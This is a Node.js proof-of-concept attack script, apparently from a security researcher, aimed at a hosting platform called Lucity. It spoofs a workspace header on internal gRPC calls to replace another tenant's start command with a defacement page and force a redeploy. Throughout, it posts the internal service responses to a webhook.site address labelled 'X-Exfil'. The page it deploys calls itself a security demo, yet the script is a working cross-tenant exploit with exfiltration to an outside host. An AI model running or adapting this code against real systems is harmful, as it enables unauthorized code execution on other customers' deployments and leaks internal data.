const https = require('https');
const http2 = require('http2');

const WEBHOOK = "https://webhook.site/04274711-419a-48cd-a21a-9dfa3987dea7";

function post(label, data) {
  return new Promise((resolve) => {
    const u = new URL(WEBHOOK);
    const req = https.request({
      hostname: u.hostname, port: 443, path: u.pathname,
      method: 'POST', headers: { 'Content-Type': 'text/plain', 'X-Exfil': label },
      timeout: 15000
    }, (res) => { res.on('data', () => {}); res.on('end', resolve); });
    req.on('error', resolve);
    req.on('timeout', () => { req.destroy(); resolve(); });
    req.write(typeof data === 'string' ? data : JSON.stringify(data, null, 2));
    req.end();
  });
}

function encodeVarint(value) {
  const bytes = [];
  while (value > 0x7f) { bytes.push((value & 0x7f) | 0x80); value >>>= 7; }
  bytes.push(value & 0x7f);
  return Buffer.from(bytes);
}

function encodeProto(fields) {
  const bufs = [];
  for (const f of fields) {
    if (f.type === 'string' && f.value !== undefined && f.value !== null) {
      const strBuf = Buffer.from(String(f.value), 'utf8');
      bufs.push(encodeVarint((f.num << 3) | 2));
      bufs.push(encodeVarint(strBuf.length));
      bufs.push(strBuf);
    }
  }
  return Buffer.concat(bufs);
}

function grpcCall(host, port, service, method, protoFields, metadata) {
  return new Promise((resolve) => {
    try {
      const client = http2.connect('http://' + host + ':' + port);
      client.on('error', (e) => { resolve({ error: 'H2: ' + e.message }); });
      client.setTimeout(10000, () => { client.close(); resolve({ error: 'TIMEOUT' }); });
      const headers = { ':method': 'POST', ':path': '/' + service + '/' + method, 'content-type': 'application/grpc', 'te': 'trailers' };
      if (metadata) Object.assign(headers, metadata);
      const req = client.request(headers);
      let data = Buffer.alloc(0);
      let respHeaders = {};
      req.on('response', (h) => { respHeaders = h; });
      req.on('data', (chunk) => { data = Buffer.concat([data, chunk]); });
      req.on('end', () => { client.close(); resolve({ status: respHeaders[':status'], grpcStatus: respHeaders['grpc-status'], grpcMessage: respHeaders['grpc-message'], dataLen: data.length, dataHex: data.toString('hex').substring(0, 500), dataUtf8: data.toString('utf8').substring(0, 2000) }); });
      req.on('error', (e) => { client.close(); resolve({ error: 'REQ: ' + e.message }); });
      const payload = protoFields ? encodeProto(protoFields) : Buffer.alloc(0);
      const frame = Buffer.alloc(5 + payload.length);
      frame[0] = 0x00; frame.writeUInt32BE(payload.length, 1); payload.copy(frame, 5);
      req.end(frame);
    } catch(e) { resolve({ error: 'CATCH: ' + e.message }); }
  });
}

async function main() {
  await post('v8-start', new Date().toISOString());

  const PACKAGER = { host: '10.104.180.117', port: 9002 };
  const DEPLOYER = { host: '10.98.64.141', port: 9003 };
  const zeitlosMeta = { 'x-lucity-workspace': 'zeitlos-software' };

  // The node one-liner that serves our Employee of the Month page
  const cmd = 'node -e \'const http=require("http");const html=`<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Loopcycles - Employee of the Month</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:system-ui,sans-serif;background:linear-gradient(135deg,#0a0a0a,#1a1a2e,#16213e);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}.c{text-align:center;padding:2rem;max-width:800px}.badge{font-size:5rem;animation:p 2s infinite}@keyframes p{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}h1{font-size:3rem;background:linear-gradient(90deg,#f39c12,#e74c3c,#f39c12);-webkit-background-clip:text;-webkit-text-fill-color:transparent}h2{color:#3498db;margin:1rem 0}.card{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);border-radius:20px;padding:3rem;margin:2rem 0}.name{font-size:2.5rem;font-weight:bold;color:#f39c12}.title{color:#bdc3c7;margin:1rem 0}.quote{font-style:italic;color:#95a5a6;border-left:3px solid #f39c12;padding-left:1rem;margin:1.5rem auto;max-width:500px;text-align:left}.warn{margin-top:2rem;padding:1rem;background:rgba(231,76,60,.1);border:1px solid rgba(231,76,60,.3);border-radius:10px;color:#e74c3c;font-size:.85rem}</style></head><body><div class="c"><div class="badge">🏆</div><h1>Employee of the Month</h1><h2>March 2026</h2><div class="card"><div style="font-size:8rem">🦅</div><div class="name">Toni Bentini</div><div class="title">Security Researcher at Monostream</div><div class="quote">"I did not break your platform. I just found a few doors you forgot to lock."</div></div><div class="warn">🚨 This page was deployed via cross-tenant gRPC workspace spoofing.<br>No credentials were stolen. Security demo by <b>Monostream</b>.<br>See: github.com/zeitlos/lucity/issues</div></div></body></html>`;http.createServer((q,r)=>{r.writeHead(200,{"Content-Type":"text/html"});r.end(html)}).listen(process.env.PORT||3000)\'';

  // SetCustomStartCommandRequest: project=1, service=2, command=3, environment=4
  // Target: loopcycles project, loopcycles service, development environment
  const setCmd = await grpcCall(PACKAGER.host, PACKAGER.port,
    'packager.PackagerService', 'SetCustomStartCommand',
    [
      { num: 1, type: 'string', value: 'loopcycles' },
      { num: 2, type: 'string', value: 'loopcycles' },
      { num: 3, type: 'string', value: cmd },
      { num: 4, type: 'string', value: 'development' }
    ],
    zeitlosMeta);
  await post('set-cmd', JSON.stringify(setCmd, null, 2));

  // Check if it worked - get project details
  const proj = await grpcCall(PACKAGER.host, PACKAGER.port,
    'packager.PackagerService', 'GetProject',
    [{ num: 1, type: 'string', value: 'loopcycles' }],
    zeitlosMeta);
  await post('project-after', JSON.stringify(proj, null, 2));

  // Sync deployment
  const sync = await grpcCall(DEPLOYER.host, DEPLOYER.port,
    'deployer.DeployerService', 'SyncDeployment',
    [{ num: 1, type: 'string', value: 'loopcycles' }, { num: 2, type: 'string', value: 'development' }],
    zeitlosMeta);
  await post('sync', JSON.stringify(sync, null, 2));

  // Check deploy status
  await new Promise(r => setTimeout(r, 3000));
  const status = await grpcCall(DEPLOYER.host, DEPLOYER.port,
    'deployer.DeployerService', 'GetDeploymentStatus',
    [{ num: 1, type: 'string', value: 'loopcycles' }, { num: 2, type: 'string', value: 'development' }],
    zeitlosMeta);
  await post('deploy-status', JSON.stringify(status, null, 2));

  await post('v8-done', 'CROSS-TENANT DEPLOY COMPLETE at ' + new Date().toISOString());
  console.log('v8 done');
}

main().catch(e => { console.error(e); post('v8-fatal', e.message); });
